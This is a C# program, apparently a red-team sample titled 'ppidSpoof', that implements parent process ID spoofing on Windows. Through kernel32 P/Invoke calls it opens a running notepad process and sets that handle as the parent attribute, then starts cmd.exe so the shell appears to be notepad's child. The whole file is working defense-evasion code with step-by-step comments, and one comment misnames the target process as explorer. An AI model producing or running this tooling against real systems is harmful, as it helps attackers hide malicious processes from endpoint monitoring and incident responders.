using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ppidSpoof
{
    class Program
    {
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo; 
            public IntPtr lpAttributeList;
        }

        static void Main(string[] args)
        {
            // Contains information about a newly created process and its primary thread
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            // Specifies the window station, desktop, standard handles, and attributes for a new process
            STARTUPINFOEX startUpInfoEx = new STARTUPINFOEX();

            IntPtr lpValueProc = IntPtr.Zero;
            IntPtr lpAttributeListSize = IntPtr.Zero;

            // Initializes the specified list of attributes for process and thread creation.
            // This call is used just to get the buffer size for memory allocation
            // lpAttributeList parameter is NULL, so lAttributeListpSize stores the required buffer size in bytes
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpAttributeListSize);

            // Allocate unmanaged memory for the AttributeList
            startUpInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpAttributeListSize);

            // this call actually initializes the attributelist
            // lpAttributeListSize is adjusted to the size of the initialized attributes
            InitializeProcThreadAttributeList(startUpInfoEx.lpAttributeList, 1, 0, ref lpAttributeListSize);

            // Get the PID of the explorer process
            Process[] proc = Process.GetProcessesByName("notepad");

            // PROCESS_CREATE_PROCESS = 0x0080 -> Required to create a process.
            // PROCESS_DUP_HANDLE = 0x0040 -> Required to duplicate a handle using DuplicateHandle.
            IntPtr hParentHandle = OpenProcess(0x00C0, false, proc[0].Id);

            // Allocates unmanaged, non-zeroed memory
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

            // writes the handle to the parent process to unmanaged memory
            Marshal.WriteIntPtr(lpValueProc, hParentHandle);

            // Adds specified attribute to the AttributeList
            // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 -> Indicates that the lpValueProc contains a pointer to a handle to the parent process
            UpdateProcThreadAttribute(startUpInfoEx.lpAttributeList, 0, (IntPtr)0x00020000, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            // dwCreationFlags
            //    EXTENDED_STARTUPINFO_PRESENT = 0x00080000 -> The process is created with extended startup information
            //    CREATE_NEW_CONSOLE = 0x00000010 -> The new process has a new console, instead of inheriting its parent's console (the default)
            CreateProcess("C:\\Windows\\System32\\cmd.exe", null, IntPtr.Zero, IntPtr.Zero, true, 0x00080010, IntPtr.Zero, null, ref startUpInfoEx, out processInfo);
        }
    }
}
